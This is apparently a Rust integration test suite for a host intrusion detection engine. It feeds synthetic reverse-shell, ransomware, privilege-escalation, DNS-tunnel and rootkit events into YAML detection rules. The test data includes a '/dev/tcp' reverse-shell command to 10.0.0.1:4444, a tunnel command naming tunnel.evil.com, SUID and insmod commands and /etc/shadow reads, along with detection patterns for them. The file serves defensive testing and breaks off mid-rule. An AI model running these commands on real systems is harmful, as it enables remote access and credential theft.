use ks_core::alert::Alert;
use ks_core::event::{
    af, ContainerEscapeEvent, EbpfTamperEvent, EventHeader, ExecEvent, FileEvent, LkmLoadEvent,
    NetEvent, SignalEvent,
};
use ks_core::rule::Severity;
use ks_engine::aggregator::{DecodedEvent, EventAggregator};
use ks_engine::chain::ChainReconstructor;
use ks_engine::detector::DetectionEngine;
use ks_engine::event_source::{EventSource, MockEventSource, MockScenario};
use ks_engine::forensic::{ForensicLogger, RotationConfig};
use tempfile::TempDir;

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    unsafe {
        core::ptr::copy_nonoverlapping(s as *const T as *const u8, data.as_mut_ptr(), size);
    }
    data
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_16(s: &str) -> [u8; 16] {
    let mut buf = [0u8; 16];
    let len = s.len().min(15);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    let parts: Vec<u8> = addr
        .split('.')
        .filter_map(|p| p.parse::<u8>().ok())
        .collect();
    if parts.len() == 4 {
        u32::from_ne_bytes([parts[0], parts[1], parts[2], parts[3]])
    } else {
        0
    }
}

fn init_pipeline(
    rule_file_names: &[&str],
) -> (
    EventAggregator,
    DetectionEngine,
    ForensicLogger,
    ChainReconstructor,
    TempDir,
) {
    let aggregator = EventAggregator::new(10000);
    let mut detector = DetectionEngine::new();

    for name in rule_file_names {
        let rules_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../rules")
            .join(name);
        if rules_dir.exists() {
            let yaml = std::fs::read_to_string(&rules_dir).unwrap();
            detector.load_rules_from_yaml(&yaml).unwrap();
        } else {
            eprintln!("警告:规则文件{}不存在,使用内联fallback", name);
        }
    }

    let dir = TempDir::new().unwrap();
    let log_path = dir.path().join("integration_test.jsonl");
    let config = RotationConfig {
        max_file_size: 10 * 1024 * 1024,
        retain_days: 30,
        compress_archives: false,
    };
    let forensic = ForensicLogger::with_rotation(log_path.clone(), config).unwrap();
    let chain_reconstructor = ChainReconstructor::new();

    (aggregator, detector, forensic, chain_reconstructor, dir)
}

fn process_events(
    aggregator: &mut EventAggregator,
    detector: &DetectionEngine,
    forensic: &mut ForensicLogger,
    events_data: &[Vec<u8>],
) -> Vec<DecodedEvent> {
    let mut decoded_events = Vec::new();

    for data in events_data {
        let event = aggregator.decode(data).unwrap();
        decoded_events.push((*event).clone());

        forensic.log_event(&event).unwrap();

        let matches = detector.match_event(&event);
        for m in &matches {
            let alert = detector.generate_alert(m, &event);
            forensic.log_alert(&alert).unwrap();
            assert!(!alert.id.is_nil());
        }

        let history: Vec<_> = aggregator.recent(1000).into_iter().cloned().collect();
        let score = detector.anomaly_score(&event, history.len());
        assert!((0.0..=1.0).contains(&score));
    }

    forensic.flush().unwrap();

    decoded_events
}

fn make_reverse_shell_events() -> Vec<Vec<u8>> {
    let mut events = Vec::new();

    let exec = ExecEvent {
        header: EventHeader {
            event_type: 1,
            _pad1: 0,
            timestamp_ns: 100_000_000_000,
            pid: 1234,
            tid: 1234,
            uid: 0,
            ppid: 100,
            comm: make_cstr_16("bash"),
            syscall_nr: 59,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/bin/bash"),
        args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    };
    events.push(encode_struct(&exec));

    let net = NetEvent {
        header: EventHeader {
            event_type: 20,
            _pad1: 0,
            timestamp_ns: 100_100_000_000,
            pid: 1234,
            tid: 1234,
            uid: 0,
            ppid: 100,
            comm: make_cstr_16("bash"),
            syscall_nr: 42,
            _pad2: 0,
            retval: 0,
        },
        saddr: ipv4_to_u32("192.168.1.100"),
        daddr: ipv4_to_u32("10.0.0.1"),
        sport: 54321,
        dport: 4444,
        proto: 6,
        family: af::AF_INET,
        saddr6: [0u8; 16],
        daddr6: [0u8; 16],
        _pad3: [0u8; 2],
    };
    events.push(encode_struct(&net));

    let file = FileEvent {
        header: EventHeader {
            event_type: 10,
            _pad1: 0,
            timestamp_ns: 100_200_000_000,
            pid: 1234,
            tid: 1234,
            uid: 0,
            ppid: 100,
            comm: make_cstr_16("cat"),
            syscall_nr: 2,
            _pad2: 0,
            retval: 3,
        },
        filename: make_cstr_256("/etc/shadow"),
        bytes: 4096,
        fd: 3,
        flags: 0,
    };
    events.push(encode_struct(&file));

    events
}

#[test]
fn test_reverse_shell_full_pipeline() {
    let (mut aggregator, mut detector, mut forensic, chain_reconstructor, dir) =
        init_pipeline(&["reverse_shell.yml", "ransomware.yml", "data_exfil.yml"]);

    let fallback_yaml = r#"
- name: "反弹Shell检测_inline"
  description: "检测通过bash -i或 /dev/tcp建立的反弹Shell连接"
  severity: critical
  conditions:
    - field: comm
      operator: contains
      value: "bash"
    - field: args
      operator: regex
      value: "(-i|/dev/tcp|/dev/udp)"
  alert_message: "检测到反弹Shell行为: 进程试图建立交互式反向连接"
  mitre_tactic: "TA0001"
  mitre_technique: "T1059.004"

- name: "非私有IP外连高危端口_inline"
  description: "检测向非私有IP的高危端口建立连接"
  severity: high
  conditions:
    - field: daddr
      operator: regex
      value: "^(?!10\\.)(?!192\\.168\\.)(?!172\\.(1[6-9]|2[0-9]|3[01])\\.).*$"
    - field: dport
      operator: regex
      value: "^(4444|1337|31337|5555|6666|6667|9999)$"
  alert_message: "检测到向外部可疑端口建立连接"
  mitre_tactic: "TA0010"
  mitre_technique: "T1041"

- name: "可疑端口连接_inline"
  description: "检测连接已知恶意端口 (不论目标IP是否为私有)"
  severity: high
  conditions:
    - field: dport
      operator: regex
      value: "^(4444|1337|31337|5555|6666|6667|9999|12345)$"
  alert_message: "检测到连接已知恶意端口"
  mitre_tactic: "TA0001"
  mitre_technique: "T1571"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let events_data = make_reverse_shell_events();
    let decoded = process_events(&mut aggregator, &detector, &mut forensic, &events_data);

    assert_eq!(decoded[0].comm, "bash");
    assert!(decoded[0].args.is_some());
    assert!(decoded[0].args.as_ref().unwrap().contains("-i"));
    assert!(decoded[0].args.as_ref().unwrap().contains("/dev/tcp"));
    assert_eq!(decoded[0].header.event_type, 1);

    assert_eq!(decoded[1].daddr.as_ref().unwrap(), "10.0.0.1");
    assert_eq!(decoded[1].dport.unwrap(), 4444);
    assert_eq!(decoded[1].proto.as_ref().unwrap(), "TCP");
    assert_eq!(decoded[1].header.event_type, 20);

    assert_eq!(decoded[2].filename.as_ref().unwrap(), "/etc/shadow");
    assert_eq!(decoded[2].header.event_type, 10);

    let matches_exec = detector.match_event(&decoded[0]);
    assert!(!matches_exec.is_empty(), "bash -i执行应至少触发一条规则");

    let matches_net = detector.match_event(&decoded[1]);
    assert!(!matches_net.is_empty(), "TCP连接4444端口应至少触发一条规则");

    let matches_file = detector.match_event(&decoded[2]);
    assert!(
        !matches_file.is_empty(),
        "/etc/shadow访问应至少触发一条规则"
    );

    let score_exec = detector.anomaly_score(&decoded[0], decoded.len());
    assert!(
        score_exec >= 0.5,
        "bash -i异常评分应 >= 0.5, 实际: {}",
        score_exec
    );

    let score_net = detector.anomaly_score(&decoded[1], decoded.len());
    assert!(
        score_net >= 0.5,
        "TCP→4444异常评分应 >= 0.5, 实际: {}",
        score_net
    );

    let log_path = dir.path().join("integration_test.jsonl");
    let verification = ForensicLogger::verify_chain(&log_path).unwrap();
    assert!(verification.total_records >= 3);

    let pid_events: Vec<_> = aggregator.by_pid(1234).into_iter().cloned().collect();
    assert_eq!(pid_events.len(), 3, "PID 1234应有3条事件");
    if let Some(chain) = chain_reconstructor.reconstruct(&pid_events) {
        assert!(!chain.steps.is_empty(), "攻击链应至少有1个步骤");
    }

    assert_eq!(aggregator.seq(), 3);
    assert!(forensic.event_count() >= 3);
}

fn make_ransomware_events() -> Vec<Vec<u8>> {
    let mut events = Vec::new();

    let exec = ExecEvent {
        header: EventHeader {
            event_type: 1,
            _pad1: 0,
            timestamp_ns: 200_000_000_000,
            pid: 5000,
            tid: 5000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("encryptor"),
            syscall_nr: 59,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/usr/local/bin/encryptor"),
        args: make_cstr_512("encryptor --target /home/user/documents"),
    };
    events.push(encode_struct(&exec));

    let file_write = FileEvent {
        header: EventHeader {
            event_type: 12,
            _pad1: 0,
            timestamp_ns: 200_100_000_000,
            pid: 5000,
            tid: 5000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("encryptor"),
            syscall_nr: 1,
            _pad2: 0,
            retval: 8192,
        },
        filename: make_cstr_256("/home/user/documents/report.pdf.encrypted"),
        bytes: 8192,
        fd: 4,
        flags: 0,
    };
    events.push(encode_struct(&file_write));

    let file_delete = FileEvent {
        header: EventHeader {
            event_type: 13,
            _pad1: 0,
            timestamp_ns: 200_200_000_000,
            pid: 5000,
            tid: 5000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("encryptor"),
            syscall_nr: 87,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/home/user/documents/report.pdf"),
        bytes: 0,
        fd: -1,
        flags: 0,
    };
    events.push(encode_struct(&file_delete));

    let ransom_note = FileEvent {
        header: EventHeader {
            event_type: 12,
            _pad1: 0,
            timestamp_ns: 200_300_000_000,
            pid: 5000,
            tid: 5000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("encryptor"),
            syscall_nr: 1,
            _pad2: 0,
            retval: 2048,
        },
        filename: make_cstr_256("/home/user/README.txt.locked"),
        bytes: 2048,
        fd: 5,
        flags: 0,
    };
    events.push(encode_struct(&ransom_note));

    events
}

#[test]
fn test_ransomware_full_pipeline() {
    let (mut aggregator, mut detector, mut forensic, chain_reconstructor, dir) =
        init_pipeline(&["ransomware.yml"]);

    let fallback_yaml = r#"
- name: "勒索软件加密行为_inline"
  description: "检测文件写入加密后缀 (.encrypted/.locked/.crypto)"
  severity: critical
  conditions:
    - field: filename
      operator: regex
      value: "(\\.encrypted|\\.locked|\\.crypto|\\.ryuk|\\.wanna|\\.cerber)"
  alert_message: "检测到可疑文件加密行为"
  mitre_tactic: "TA0040"
  mitre_technique: "T1486"

- name: "敏感文件访问_inline"
  description: "检测对 /etc/shadow的访问"
  severity: high
  conditions:
    - field: filename
      operator: contains
      value: "/etc/shadow"
  alert_message: "检测到对 /etc/shadow的访问"
  mitre_tactic: "TA0006"
  mitre_technique: "T1003.008"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let events_data = make_ransomware_events();
    let decoded = process_events(&mut aggregator, &detector, &mut forensic, &events_data);

    assert_eq!(decoded[0].comm, "encryptor");
    assert_eq!(decoded[0].header.event_type, 1);

    assert_eq!(decoded[1].header.event_type, 12);
    let fname = decoded[1].filename.as_ref().unwrap();
    assert!(fname.contains(".encrypted"), "文件名应含 .encrypted后缀");

    assert_eq!(decoded[2].header.event_type, 13);
    assert_eq!(
        decoded[2].filename.as_ref().unwrap(),
        "/home/user/documents/report.pdf"
    );

    assert_eq!(decoded[3].header.event_type, 12);
    let fname4 = decoded[3].filename.as_ref().unwrap();
    assert!(fname4.contains(".locked"), "勒索信文件名应含 .locked后缀");

    let matches_encrypt = detector.match_event(&decoded[1]);
    assert!(
        !matches_encrypt.is_empty(),
        ".encrypted文件应触发勒索软件规则"
    );

    let matches_locked = detector.match_event(&decoded[3]);
    assert!(
        !matches_locked.is_empty(),
        ".locked勒索信应触发勒索软件规则"
    );

    let score_encrypt = detector.anomaly_score(&decoded[1], decoded.len());
    assert!(
        score_encrypt > 0.0,
        "加密文件异常评分应 > 0.0, 实际: {}",
        score_encrypt
    );

    let log_path = dir.path().join("integration_test.jsonl");
    let verification = ForensicLogger::verify_chain(&log_path).unwrap();
    assert!(verification.total_records >= 4);

    let pid_events: Vec<_> = aggregator.by_pid(5000).into_iter().cloned().collect();
    assert_eq!(pid_events.len(), 4, "PID 5000应有4条事件");
    if let Some(chain) = chain_reconstructor.reconstruct(&pid_events) {
        assert!(!chain.steps.is_empty());
    }

    assert_eq!(aggregator.seq(), 4);
    assert!(forensic.event_count() >= 4);
}

fn make_privilege_escalation_events() -> Vec<Vec<u8>> {
    let mut events = Vec::new();

    let exec = ExecEvent {
        header: EventHeader {
            event_type: 1,
            _pad1: 0,
            timestamp_ns: 300_000_000_000,
            pid: 3000,
            tid: 3000,
            uid: 1000,
            ppid: 2000,
            comm: make_cstr_16("chmod"),
            syscall_nr: 59,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/usr/bin/chmod"),
        args: make_cstr_512("chmod u+s /usr/local/bin/custom_binary"),
    };
    events.push(encode_struct(&exec));

    let sudoers_modify = FileEvent {
        header: EventHeader {
            event_type: 12,
            _pad1: 0,
            timestamp_ns: 300_100_000_000,
            pid: 3000,
            tid: 3000,
            uid: 0,
            ppid: 2000,
            comm: make_cstr_16("vi"),
            syscall_nr: 1,
            _pad2: 0,
            retval: 512,
        },
        filename: make_cstr_256("/etc/sudoers"),
        bytes: 512,
        fd: 3,
        flags: 0,
    };
    events.push(encode_struct(&sudoers_modify));

    let ptrace = SignalEvent {
        header: EventHeader {
            event_type: 30,
            _pad1: 0,
            timestamp_ns: 300_200_000_000,
            pid: 3000,
            tid: 3000,
            uid: 0,
            ppid: 2000,
            comm: make_cstr_16("gdb"),
            syscall_nr: 101,
            _pad2: 0,
            retval: 0,
        },
        target_pid: 1234,
        signal: 0,
    };
    events.push(encode_struct(&ptrace));

    events
}

#[test]
fn test_privilege_escalation_full_pipeline() {
    let (mut aggregator, mut detector, mut forensic, chain_reconstructor, dir) =
        init_pipeline(&["privilege_escalation.yml"]);

    let fallback_yaml = r#"
- name: "SUID提权检测_inline"
  description: "检测通过chmod设置SUID位进行提权"
  severity: critical
  conditions:
    - field: comm
      operator: equals
      value: "chmod"
    - field: args
      operator: regex
      value: "(\\+s|u\\+s|4755|4[0-9]{3})"
  alert_message: "检测到chmod设置SUID位操作"
  mitre_tactic: "TA0004"
  mitre_technique: "T1548.001"

- name: "ptrace进程注入检测_inline"
  description: "检测通过ptrace系统调用注入其他进程"
  severity: critical
  conditions:
    - field: syscall_nr
      operator: equals
      value: "101"
  alert_message: "检测到ptrace系统调用"
  mitre_tactic: "TA0004"
  mitre_technique: "T1055.009"

- name: "sudo配置篡改检测_inline"
  description: "检测对 /etc/sudoers的写入"
  severity: critical
  conditions:
    - field: filename
      operator: contains
      value: "/etc/sudoers"
  alert_message: "检测到 /etc/sudoers被修改"
  mitre_tactic: "TA0004"
  mitre_technique: "T1548.003"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let events_data = make_privilege_escalation_events();
    let decoded = process_events(&mut aggregator, &detector, &mut forensic, &events_data);

    assert_eq!(decoded[0].comm, "chmod");
    assert_eq!(decoded[0].header.event_type, 1);
    assert!(decoded[0].args.as_ref().unwrap().contains("u+s"));

    assert_eq!(decoded[1].header.event_type, 12);
    assert_eq!(decoded[1].filename.as_ref().unwrap(), "/etc/sudoers");

    assert_eq!(decoded[2].header.event_type, 30);
    assert_eq!(decoded[2].header.syscall_nr, 101);
    assert_eq!(decoded[2].target_pid.unwrap(), 1234);

    let matches_chmod = detector.match_event(&decoded[0]);
    assert!(!matches_chmod.is_empty(), "chmod +s应触发SUID提权规则");

    let matches_sudoers = detector.match_event(&decoded[1]);
    assert!(
        !matches_sudoers.is_empty(),
        "/etc/sudoers应触发sudo配置篡改规则"
    );

    let matches_ptrace = detector.match_event(&decoded[2]);
    assert!(
        !matches_ptrace.is_empty(),
        "ptrace syscall_nr=101应触发注入规则"
    );

    let score_chmod = detector.anomaly_score(&decoded[0], decoded.len());
    assert!(
        score_chmod >= 0.4,
        "chmod +s异常评分应 >= 0.4, 实际: {}",
        score_chmod
    );

    let score_sudoers = detector.anomaly_score(&decoded[1], decoded.len());
    assert!(
        score_sudoers >= 0.35,
        "/etc/sudoers异常评分应 >= 0.35, 实际: {}",
        score_sudoers
    );

    let log_path = dir.path().join("integration_test.jsonl");
    let verification = ForensicLogger::verify_chain(&log_path).unwrap();
    assert!(verification.total_records >= 3);

    let pid_events: Vec<_> = aggregator.by_pid(3000).into_iter().cloned().collect();
    assert_eq!(pid_events.len(), 3);
    if let Some(chain) = chain_reconstructor.reconstruct(&pid_events) {
        assert!(!chain.steps.is_empty());
    }

    assert_eq!(aggregator.seq(), 3);
    assert!(forensic.event_count() >= 3);
}

fn make_dns_tunnel_events() -> Vec<Vec<u8>> {
    let mut events = Vec::new();

    let exec = ExecEvent {
        header: EventHeader {
            event_type: 1,
            _pad1: 0,
            timestamp_ns: 400_000_000_000,
            pid: 7000,
            tid: 7000,
            uid: 1000,
            ppid: 1,
            comm: make_cstr_16("dnstunnel"),
            syscall_nr: 59,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/usr/local/bin/dnstunnel"),
        args: make_cstr_512("dnstunnel --server 8.8.8.8 --domain tunnel.evil.com"),
    };
    events.push(encode_struct(&exec));

    let dns1 = NetEvent {
        header: EventHeader {
            event_type: 24,
            _pad1: 0,
            timestamp_ns: 400_100_000_000,
            pid: 7000,
            tid: 7000,
            uid: 1000,
            ppid: 1,
            comm: make_cstr_16("dnstunnel"),
            syscall_nr: 44,
            _pad2: 0,
            retval: 256,
        },
        saddr: ipv4_to_u32("192.168.1.50"),
        daddr: ipv4_to_u32("8.8.8.8"),
        sport: 53000,
        dport: 53,
        proto: 17,
        family: af::AF_INET,
        saddr6: [0u8; 16],
        daddr6: [0u8; 16],
        _pad3: [0u8; 2],
    };
    events.push(encode_struct(&dns1));

    let dns2 = NetEvent {
        header: EventHeader {
            event_type: 24,
            _pad1: 0,
            timestamp_ns: 400_110_000_000,
            pid: 7000,
            tid: 7000,
            uid: 1000,
            ppid: 1,
            comm: make_cstr_16("dnstunnel"),
            syscall_nr: 44,
            _pad2: 0,
            retval: 512,
        },
        saddr: ipv4_to_u32("192.168.1.50"),
        daddr: ipv4_to_u32("1.2.3.4"),
        sport: 53001,
        dport: 53,
        proto: 17,
        family: af::AF_INET,
        saddr6: [0u8; 16],
        daddr6: [0u8; 16],
        _pad3: [0u8; 2],
    };
    events.push(encode_struct(&dns2));

    events
}

#[test]
fn test_dns_tunnel_full_pipeline() {
    let (mut aggregator, mut detector, mut forensic, chain_reconstructor, dir) =
        init_pipeline(&["dns_tunnel.yml"]);

    let fallback_yaml = r#"
- name: "dns_tunnel_long_query_inline"
  description: "DNS查询UDP dport=53"
  severity: high
  conditions:
    - field: proto
      operator: equals
      value: "UDP"
    - field: dport
      operator: equals
      value: "53"
  alert_message: "DNS UDP查询端口53"
  mitre_tactic: "TA0010"
  mitre_technique: "T1041"

- name: "dns_tunnel_suspicious_domain_inline"
  description: "DNS查询公网DNS服务器"
  severity: medium
  conditions:
    - field: proto
      operator: equals
      value: "UDP"
    - field: dport
      operator: equals
      value: "53"
    - field: daddr
      operator: not_regex
      value: "^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|127\\.|0\\.0\\.0\\.0|::1|fe80:)"
  alert_message: "DNS查询公网DNS服务器"
  mitre_tactic: "TA0011"
  mitre_technique: "T1071.004"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let events_data = make_dns_tunnel_events();
    let decoded = process_events(&mut aggregator, &detector, &mut forensic, &events_data);

    assert_eq!(decoded[0].comm, "dnstunnel");
    assert_eq!(decoded[0].header.event_type, 1);

    assert_eq!(decoded[1].header.event_type, 24);
    assert_eq!(decoded[1].daddr.as_ref().unwrap(), "8.8.8.8");
    assert_eq!(decoded[1].dport.unwrap(), 53);
    assert_eq!(decoded[1].proto.as_ref().unwrap(), "UDP");

    assert_eq!(decoded[2].header.event_type, 24);
    assert_eq!(decoded[2].daddr.as_ref().unwrap(), "1.2.3.4");
    assert_eq!(decoded[2].dport.unwrap(), 53);
    assert_eq!(decoded[2].proto.as_ref().unwrap(), "UDP");

    let matches_dns1 = detector.match_event(&decoded[1]);
    assert!(
        !matches_dns1.is_empty(),
        "UDP:53 DNS查询应触发DNS隧道规则"
    );

    let matches_dns2 = detector.match_event(&decoded[2]);
    assert!(!matches_dns2.is_empty(), "第二次UDP:53查询也应触发规则");

    let score_dns = detector.anomaly_score(&decoded[1], decoded.len());
    assert!(
        score_dns >= 0.0,
        "DNS异常评分应 >= 0.0, 实际: {}",
        score_dns
    );

    let log_path = dir.path().join("integration_test.jsonl");
    let verification = ForensicLogger::verify_chain(&log_path).unwrap();
    assert!(verification.total_records >= 3);

    let pid_events: Vec<_> = aggregator.by_pid(7000).into_iter().cloned().collect();
    assert_eq!(pid_events.len(), 3);
    if let Some(chain) = chain_reconstructor.reconstruct(&pid_events) {
        assert!(!chain.steps.is_empty());
    }

    assert_eq!(aggregator.seq(), 3);
    assert!(forensic.event_count() >= 3);
}

fn make_rootkit_events() -> Vec<Vec<u8>> {
    let mut events = Vec::new();

    let exec = ExecEvent {
        header: EventHeader {
            event_type: 1,
            _pad1: 0,
            timestamp_ns: 500_000_000_000,
            pid: 8000,
            tid: 8000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("insmod"),
            syscall_nr: 59,
            _pad2: 0,
            retval: 0,
        },
        filename: make_cstr_256("/sbin/insmod"),
        args: make_cstr_512("insmod /tmp/rootkit.ko"),
    };
    events.push(encode_struct(&exec));

    let proc_access = FileEvent {
        header: EventHeader {
            event_type: 10,
            _pad1: 0,
            timestamp_ns: 500_100_000_000,
            pid: 8000,
            tid: 8000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("insmod"),
            syscall_nr: 2,
            _pad2: 0,
            retval: 3,
        },
        filename: make_cstr_256("/proc/kallsyms"),
        bytes: 0,
        fd: 3,
        flags: 0,
    };
    events.push(encode_struct(&proc_access));

    let sigkill = SignalEvent {
        header: EventHeader {
            event_type: 31,
            _pad1: 0,
            timestamp_ns: 500_200_000_000,
            pid: 8000,
            tid: 8000,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("kill"),
            syscall_nr: 62,
            _pad2: 0,
            retval: 0,
        },
        target_pid: 999,
        signal: 9,
    };
    events.push(encode_struct(&sigkill));

    events
}

#[test]
fn test_rootkit_full_pipeline() {
    let (mut aggregator, mut detector, mut forensic, chain_reconstructor, dir) =
        init_pipeline(&["rootkit_detect.yml", "privilege_escalation.yml"]);

    let fallback_yaml = r#"
- name: "rootkit_module_load_inline"
  description: "insmod内核模块加载"
  severity: critical
  conditions:
    - field: comm
      operator: equals
      value: "insmod"
  alert_message: "内核模块加载 — 可能是Rootkit"
  mitre_tactic: "TA0003"
  mitre_technique: "T1547"

- name: "rootkit_hidden_process_kill_inline"
  description: "SIGKILL发送模式"
  severity: medium
  conditions:
    - field: signal
      operator: equals
      value: "9"
    - field: comm
      operator: regex
      value: "(kill|pkill|skill)"
  alert_message: "SIGKILL发送 — 可能是Rootkit清理"
  mitre_tactic: "TA0005"
  mitre_technique: "T1014"

- name: "内核模块加载检测_inline"
  description: "检测通过insmod/modprobe加载内核模块"
  severity: high
  conditions:
    - field: comm
      operator: regex
      value: "(insmod|modprobe)"
  alert_message: "检测到内核模块加载操作"
  mitre_tactic: "TA0004"
  mitre_technique: "T1547.006"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let events_data = make_rootkit_events();
    let decoded = process_events(&mut aggregator, &detector, &mut forensic, &events_data);

    assert_eq!(decoded[0].comm, "insmod");
    assert_eq!(decoded[0].header.event_type, 1);
    assert!(decoded[0].args.as_ref().unwrap().contains("rootkit.ko"));

    assert_eq!(decoded[1].header.event_type, 10);
    assert_eq!(decoded[1].filename.as_ref().unwrap(), "/proc/kallsyms");

    assert_eq!(decoded[2].header.event_type, 31);
    assert_eq!(decoded[2].signal.unwrap(), 9);
    assert_eq!(decoded[2].target_pid.unwrap(), 999);

    let matches_insmod = detector.match_event(&decoded[0]);
    assert!(
        !matches_insmod.is_empty(),
        "insmod应触发rootkit模块加载规则"
    );

    let matches_sigkill = detector.match_event(&decoded[2]);
    assert!(
        !matches_sigkill.is_empty(),
        "SIGKILL+kill应触发rootkit信号规则"
    );

    let score_proc = detector.anomaly_score(&decoded[1], decoded.len());
    assert!(
        score_proc >= 0.15,
        "/proc/kallsyms异常评分应 >= 0.15, 实际: {}",
        score_proc
    );

    let log_path = dir.path().join("integration_test.jsonl");
    let verification = ForensicLogger::verify_chain(&log_path).unwrap();
    assert!(verification.total_records >= 3);

    let pid_events: Vec<_> = aggregator.by_pid(8000).into_iter().cloned().collect();
    assert_eq!(pid_events.len(), 3);
    if let Some(chain) = chain_reconstructor.reconstruct(&pid_events) {
        assert!(!chain.steps.is_empty());
    }

    assert_eq!(aggregator.seq(), 3);
    assert!(forensic.event_count() >= 3);
}

#[test]
fn test_config_integration() {
    let config = ks_engine::config::Config::default();
    assert_eq!(config.engine.buffer_size, 10_000);

    let aggregator = EventAggregator::new(config.engine.buffer_size);
    assert!(aggregator.is_empty());

    assert!(config.validate().is_ok());

    let mut detector = DetectionEngine::new();
    let yaml = r#"
- name: "config_test_rule"
  description: "配置集成测试规则"
  severity: low
  conditions:
    - field: comm
      operator: equals
      value: "test"
  alert_message: "配置集成测试"
"#;
    detector.load_rules_from_yaml(yaml).unwrap();
    assert_eq!(detector.rule_count(), 1);

    let header = EventHeader {
        event_type: 2,
        _pad1: 0,
        timestamp_ns: 600_000_000_000,
        pid: 1,
        tid: 1,
        uid: 0,
        ppid: 0,
        comm: make_cstr_16("test"),
        syscall_nr: 0,
        _pad2: 0,
        retval: 0,
    };
    let data = encode_struct(&header);
    let mut agg = EventAggregator::new(config.engine.buffer_size);
    let event = agg.decode(&data).unwrap();
    assert_eq!(event.comm, "test");

    let matches = detector.match_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].rule_name, "config_test_rule");
}

#[tokio::test]
async fn test_ransomware_full_chain() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["ransomware.yml"]);

    let fallback_yaml = r#"
- name: "勒索软件加密行为_inline"
  description: "检测文件写入加密后缀 (.encrypted/.locked/.crypto)"
  severity: critical
  conditions:
    - field: filename
      operator: regex
      value: "(\\.encrypted|\\.locked|\\.crypto|\\.ryuk|\\.wanna|\\.cerber)$"
  alert_message: "检测到可疑文件加密行为"
  mitre_tactic: "TA0040"
  mitre_technique: "T1486"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let mut source = MockEventSource::new_with_scenario(MockScenario::Ransomware).with_loop(false);
    let mut decoded_events: Vec<DecodedEvent> = Vec::new();
    let mut alerts: Vec<Alert> = Vec::new();

    while let Ok(Some(bytes)) = source.next_bytes().await {
        let event = match aggregator.decode(&bytes) {
            Ok(e) => e,
            Err(_) => continue,
        };
        decoded_events.push((*event).clone());

        forensic.log_event(&event).unwrap();

        let matches = detector.match_event(&event);
        for m in &matches {
            let alert = detector.generate_alert(m, &event);
            forensic.log_alert(&alert).unwrap();
            alerts.push(alert);
        }
    }
    forensic.flush().unwrap();

    assert!(
        decoded_events.len() >= 5,
        "勒索场景事件数应 >= 5, 实际: {}",
        decoded_events.len()
    );

    assert!(
        !alerts.is_empty(),
        "应至少有1条告警 (.encrypted文件匹配勒索规则), 实际告警数: {}",
        alerts.len()
    );

    let tail_hash = forensic.chain_tail_hash();
    assert!(!tail_hash.is_empty(), "chain_tail_hash不应为空");
    assert_ne!(
        tail_hash, "0000000000000000000000000000000000000000000000000000000000000000",
        "chain_tail_hash应已推进 (非genesis hash), 实际: {}",
        tail_hash
    );

    let has_high_or_critical = alerts
        .iter()
        .any(|a| matches!(a.severity, Severity::High | Severity::Critical));
    assert!(
        has_high_or_critical,
        "应至少有一条告警severity为high或critical"
    );

    let encrypted_alerts: Vec<_> = alerts
        .iter()
        .filter(|a| a.rule_name.contains("勒索") || a.rule_name.contains("encrypt"))
        .collect();
    assert!(
        !encrypted_alerts.is_empty(),
        "应有勒索软件相关告警 (rule_name含 '勒索' 或 'encrypt')"
    );

    assert!(forensic.event_count() >= 5, "forensic event_count应 >= 5");
    assert!(aggregator.seq() >= 5, "aggregator seq应 >= 5");
}

#[tokio::test]
async fn test_privilege_escalation_full_chain() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["privilege_escalation.yml"]);

    let fallback_yaml = r#"
- name: "SUID提权检测_inline"
  description: "检测通过chmod设置SUID位进行提权"
  severity: critical
  conditions:
    - field: comm
      operator: equals
      value: "chmod"
    - field: args
      operator: regex
      value: "(\\+s|u\\+s|4755|4[0-9]{3})"
  alert_message: "检测到chmod设置SUID位操作"
  mitre_tactic: "TA0004"
  mitre_technique: "T1548.001"

- name: "sudo配置篡改检测_inline"
  description: "检测对 /etc/sudoers文件的写入操作"
  severity: critical
  conditions:
    - field: filename
      operator: contains
      value: "/etc/sudoers"
  alert_message: "检测到 /etc/sudoers文件被修改"
  mitre_tactic: "TA0004"
  mitre_technique: "T1548.003"

- name: "LD_PRELOAD劫持检测_inline"
  description: "检测通过LD_PRELOAD环境变量进行动态链接库劫持"
  severity: high
  conditions:
    - field: args
      operator: contains
      value: "LD_PRELOAD"
  alert_message: "检测到进程设置LD_PRELOAD环境变量"
  mitre_tactic: "TA0004"
  mitre_technique: "T1574.006"

- name: "ptrace进程注入检测_inline"
  description: "检测通过ptrace系统调用注入其他进程"
  severity: critical
